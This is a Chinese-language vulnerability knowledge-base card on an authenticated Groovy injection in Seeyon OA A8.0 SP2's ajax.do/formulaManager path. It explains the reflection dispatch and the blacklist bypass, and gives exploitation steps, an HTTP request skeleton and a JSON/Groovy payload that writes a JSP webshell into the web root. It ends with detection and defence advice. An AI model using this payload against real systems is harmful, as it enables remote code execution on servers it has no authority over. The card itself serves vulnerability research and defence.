---
id: web-java-component-seeyon-ajaxdo-formulamanager-groovy-file-write-jsp
title: 致远 OA ajax.do 反射调用 formulaManager：formulaExpression 拼进 Groovy 脚本执行，黑名单可绕过写 JSP WebShell
type: scenario
domain: web
path: web/java/component
technique: seeyon-ajaxdo-formulamanager-groovy-script-file-write
tags:
- java
- seeyon
- oa
- ajax
- reflection
- groovy
- expression-injection
- blacklist-bypass
- arbitrary-file-write
- jsp
- webshell
- authenticated
cve: []
severity: high
confidence: high
affected_versions: A8.0 SP2
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V538
  verified_at: '2026-11-11T19:01:30+08:00'
  notes: 已对照原文全文与全部12张截图核对：图01 Burp 请求 POST /seeyon/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip（managerMethod=validate&arguments=<编码后的gzip串>），响应 {"message":null,"code":"59260854","details":null}；图02 天蝎连接 http://10.0.103.5/mzr2.jsp 成功，根目录 C:/Seeyon/A8/ApacheJetspeed/webapps/ROOT/ 下 mzr2.jsp 1.32KB；图03 spring-default.xml 中 <bean name="/ajax.do" class="com.seeyon.ctp.common.service.AjaxController" autowire="byName"/>；图04 AppContext.getBean→beanCacheMap size=848；图05-06 invokeService/invokeMethod 与 target.invoke(service,args)；图07 FormulaManagerImpl.validate 上 @CheckRoleAccess(roleTypes={GroupAdmin,AccountAdministrator,FormAdmin,VReportAdmin,...}) 且方法体就是 return FormulaUtil.validate(...)；图08 FormulaType Constant=0/Variable=1/GroovyFunction=2/JavaFunction=3；图09 eval→log+ScriptEvaluator.getInstance(true).eval；图10 SCRIPT_BLACKLIST 恰为 System.exit/Runtime/ClassLoader/delete/JDBCAgent/Socket/PrintWriter 七项；图11 FormulaUtil.validate 的 formulaType 判断与 script=formula.toString()+";"+expression、eval；图12
    Formula.toString 的 `def static `+name+"("+")"+"{\n"+formulaExpression+"\n}" 拼接。卡片技术点、参数、PoC、请求/响应与原文一致。affected_versions：原文『漏洞环境：致远A8.0 SP2（需要登录）』明确，已 set-versions 为 A8.0 SP2，未扩展区间（不猜）。未验证点：原文未实测 @CheckRoleAccess 在目标版本的实际强制位置/严格度（卡内已标注原文会话为管理员）；arguments 依赖致远 ZipUtil.compressResponse 的字节到字符转换（原文请求可见 %C2%8B），未复现。dedup：duplicate 0/likely 0，仅 2 张同产品相关卡（xrdController 文件复制穿越、autoinstall Cookie 目录穿越）入口/sink 均不同，非同链。未执行文中 PoC。
url: /docs/web/java/component/web-java-component-seeyon-ajaxdo-formulamanager-groovy-file-write-jsp/
draft: false
kb_aliases:
- 致远OA Ajax.do 任意文件上传
- 致远 OA formulaManager Groovy 注入
- Seeyon ajax.do formulaManager getshell
- FormulaManagerImpl.validate formulaExpression
- FormulaUtil.validate Groovy 黑名单绕过
- 致远 A8.0 SP2 ajax.do 反射调用
---

## 一句话结论

致远 OA 的 `/seeyon/ajax.do?method=ajaxAction` 把 `managerName` 当 Spring bean 名、`managerMethod` 当方法名、`arguments`（gzip 压缩后 URL 编码的 JSON 数组）当参数做反射调用；攻击者登录后指定 `managerName=formulaManager&managerMethod=validate`，在 `Formula` 对象的 `formulaExpression` 中注入 Groovy 代码，`FormulaUtil.validate` 会把 `formula.toString()+expression` 交给 `ScriptEvaluator.eval` 执行，且只做 7 个关键字黑名单，用 `java.io.File` 即可以应用进程权限写任意 JSP 文件，访问即 WebShell。

## 原理

- **入口分发**：`/seeyon/ajax.do` 在 `spring-default.xml` 映射到 `com.seeyon.ctp.common.service.AjaxController`。`method=ajaxAction` 调用 `ajaxAction()`，其内部 `invokeService()` 从请求取四个参数：
  - `managerName` → `getService()` → `AppContext.getBean(name)`，取容器中已注册的 bean 实例（原文截图缓存约 848 个），类型为 `DataSource`/`Session`/`SessionFactory` 的 bean 被置空并抛异常拒绝；
  - `managerMethod` 与解压后的 `arguments` → `invokeMethod()`：`JSONUtil.parseJSONString(arguments)` 得到 List，按 `serviceName_methodName_argsNum` 命中方法缓存，未命中则 `judgeCandidate()` 反射查找同名同参数个数的方法，逐个参数按目标类型做 JSON 转换，最后 `target.invoke(service, args)`。
  - 类名、方法名、参数全部来自请求，构成“任意已注册 bean 的任意 public 方法 + 指定参数”的调用原语。
- **sink 入口**：`FormulaManagerImpl.validate(Formula formula, String expression, Map context, boolean isSave)` 直接调用 `FormulaUtil.validate(formula, expression, context, isSave)`。方法上标注 `@CheckRoleAccess`（GroupAdmin、AccountAdministrator、FormAdmin、VReportAdmin 等角色）。
- **脚本拼接**：`FormulaUtil.validate` 仅当 `formula.getFormulaType()` 为 `GroovyFunction`（枚举值 2）或 `Variable`（枚举值 1）时继续，随后 `String script = formula.toString() + ";" + expression; eval(script, context);`。而 `Formula.toString()` 对这两种类型生成 `def static <formulaName>(<params>) {\n<formulaExpression>\n}`——`formulaExpression` 被原样拼进 Groovy 源码，等同攻击者可控脚本。
- **语法闭合技巧**：`formulaExpression` 末尾写 `...}; test(); def static xxx(){`，即可提前闭合 `def static test(){` 函数体、在脚本顶层调用 `test()` 执行，最后由拼接追加的 `}` 闭合占位的 `def static xxx(){`，使整段脚本语法完整。
- **为什么黑名单不成立**：`eval()` 先调用 `log(scriptText)` 做检查，`SCRIPT_BLACKLIST` 只包含 `System.exit`、`Runtime`、`ClassLoader`、`delete`、`JDBCAgent`、`Socket`、`PrintWriter`，按字符串 `indexOf` 匹配；未禁用 `java.io.File`、`FileOutputStream`、`sun.misc.BASE64Decoder`、反序列化或反射，因此可以任意读写文件、加载字节码。这不是能力沙箱，只是字符串黑名单。
- **为什么能变成 WebShell**：Groovy 脚本在 Web 容器同一 JVM 内执行，文件权限即应用进程权限；`new java.io.File("../webapps/ROOT/xxx.jsp") << content` 即可把 JSP 落到 Web 根目录，请求该 JSP 时由容器编译执行，完成 RCE。相对路径按应用工作目录（原文环境为致远 JetSpeed 目录）调整。

## 触发条件

- 目标为受影响版本（原文漏洞环境：致远 A8.0 SP2）。
- 攻击者拥有有效登录会话（原文明确“需要登录”）。`FormulaManagerImpl.validate` 上的 `@CheckRoleAccess` 要求 GroupAdmin/AccountAdministrator/FormAdmin/VReportAdmin 等角色之一；原文测试会话为管理员，角色切面在实际版本中的严格程度原文未展开。
- `ajax.do` 可达，`formulaManager` bean 已注册（默认存在），请求可通过 `invokeService` 的 bean 类型过滤。
- 应用进程对目标 Web 目录有写权限。

## 利用步骤

1. 登录致远 OA，获取 `JSESSIONID`。
2. 构造 `Formula` JSON 对象：`formulaType=2`（GroovyFunction）、`formulaName=test`、`formulaExpression` 为写文件的 Groovy 代码（见 PoC）。
3. 组装参数数组 `[formula对象, "", {}, true]`（依次对应 `validate` 的 `formula`、`expression`、`context`、`isSave`），用致远自带 `ZipUtil.compressResponse(jsonString, "gzip", "UTF-8")` 压缩成字符串，再 `URLEncoder.encode` 得到 `arguments` 参数值。
4. 发送请求（URL 带 `requestCompress=gzip`），body 为 `managerMethod=validate&arguments=<编码后的串>`；原文响应 `{"message":null,"code":"59260854","details":null}` 表示反射调用成功。
5. 访问写出的 JSP（原文写入 `../webapps/ROOT/mzr2.jsp`，对应 `http://target/mzr2.jsp`），WebShell 客户端连接（原文天蝎密码 `sky`）。

## PoC

请求骨架：

```http
POST /seeyon/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: JSESSIONID=<session>
Content-Length: <n>

managerMethod=validate&arguments=<URLEncoder(gzip(JSON))>
```

最小化参数 JSON（把原文的 Base64 加密 shell 换成直接写内容）：

```json
[
  {"formulaType":2,"formulaName":"test","formulaExpression":"def filePath = \"../webapps/ROOT/poc.jsp\";java.io.File file = new java.io.File(filePath);file << 'POC<% out.print(1+1); %>';};test();def static xxx(){"},
  "",
  {},
  true
]
```

经 `formula.toString()` 包装后实际执行的 Groovy：

```groovy
def static test(){
def filePath = "../webapps/ROOT/poc.jsp";java.io.File file = new java.io.File(filePath);file << 'POC<% out.print(1+1); %>';};test();def static xxx(){
}
```

- `arguments` 不能简单用标准 gzip 直传：原文用致远 `ZipUtil.compressResponse(listJson, "gzip", "UTF-8")` 生成字符串（gzip 原始字节按单字节字符转换，请求中可见 `%C2%8B` 这类编码），再 `URLEncoder.encode`。自研 PoC 需复刻其字节到字符的转换后再 URL 编码，否则服务端 `ZipUtil.uncompressRequest` 解压失败。
- 原文附完整 Java 生成器（依赖 Seeyon 内部类 `ZipUtil`/`JSONUtil`）：`formula.setFormulaType(2); formula.setFormulaName("test"); formula.setFormulaExpression(payload);` 后序列化 `[formula, "", {}, true]`、压缩并编码。其 payload 用 `sun.misc.BASE64Decoder` 解码 Base64 天蝎马，`file << decodeString` 写入 `mzr2.jsp`，规避了黑名单中的全部关键字。

## 变体与关联

- 变体：`managerName` 可指定任意已注册 bean（原文称约 848 个），`managerMethod`/`arguments` 完全可控；除 `formulaManager` 外，其他带危险方法（文件、命令、脚本）的 bean 可组成新利用链，本卡只覆盖已演示的 formulaManager。
- 变体：黑名单按字符串包含匹配，可用字符串拼接、反射、`File`/`Files`、Groovy 动态特性等方式规避；`Runtime`/`Socket` 被禁不代表能力被真正限制。
- 关联：[[web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal]]（同产品另一条写 JSP 链，入口与 sink 不同）；[[binary-pwn-sandbox-escape-groovy-reflection-blacklist-gaps]]、[[binary-pwn-sandbox-escape-groovy-interpreter-reinstantiation]]（Groovy 黑名单沙箱逃逸的通用手法）。
- 关联：[[web-java-component-landray-ekp-dataxml-sbean-beanshell-rce]]（同为 OA 的 bean 反射分发 + 脚本引擎求值导致 RCE）。

## 检测与防御

- 检测：`ajax.do` 请求中出现 `managerName=formulaManager`、`managerMethod=validate`、`requestCompress=gzip`，且 `arguments` 为高熵 URL 编码串；解压后的 `formulaExpression` 含 `File`、`BASE64Decoder`、`<<`、`};`、`def static` 等代码特征。
- 检测：`FormulaUtil.log` 会向 `SCRIPTLOG` 记录远程地址、登录名与完整脚本文本，可据此审计脚本内容；同时监控 Web 根目录新增或改写的 JSP 文件。
- 防御：升级官方修复版本；`ajax.do` 的 `managerName` 改为白名单而非任意 `getBean`，并限制 `formulaManager` 等后台 bean 的调用角色。
- 防御：禁止 `formulaExpression` 参与 Groovy 源码拼接，改为结构化表达式并禁用文件/进程/反射 API；字符串黑名单无法构成沙箱，应使用白名单或无能力脚本环境。
- 防御：Web 目录对应用进程只读，JSP 文件完整性监控与落地告警。
